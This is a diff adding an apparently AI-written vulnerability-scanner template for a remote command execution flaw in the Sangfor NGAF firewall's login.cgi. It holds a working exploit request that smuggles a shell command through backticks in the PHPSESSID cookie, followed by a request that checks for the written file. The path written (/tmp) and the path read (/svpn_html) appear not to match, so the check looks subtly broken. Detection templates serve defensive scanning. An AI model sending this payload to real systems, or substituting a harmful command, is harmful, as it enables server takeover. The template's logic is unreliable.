@@ -1,0 +1,52 @@
+id: sangfor-ngaf-login-rce
+info:
+  name: Sangfor NGAF login.cgi Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Sangfor next-generation firewall has a command execution vulnerability at the PHPSESSID under the login.cgi file. An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.
+  tags: command-execution,rce,firewall
+  reference:
+    - https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/
+  classification:
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        POST /cgi-bin/login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: Application/X-www-Form
+        Y-Forwarded-For: 127.0.0.1
+        Cookie: PHPSESSID=`$(echo test_string > /tmp/exploit_test)`;
+
+        {"opr":"login", "data":{"user": "watchTowr", "pwd": "watchTowr", "vericode": "NSLB", "privacy_enable": "0"}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Have Not HTTP_Cookie"
+
+  - raw:
+      - |
+        GET /svpn_html/exploit_test HTTP/1.1
+        Host: {{Hostname}}
+        Y-Forwarded-For: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test_string"
+    extractors:
+      - type: regex
+        name: rce_confirmation
+        regex:
+          - "test_string"
+        part: body
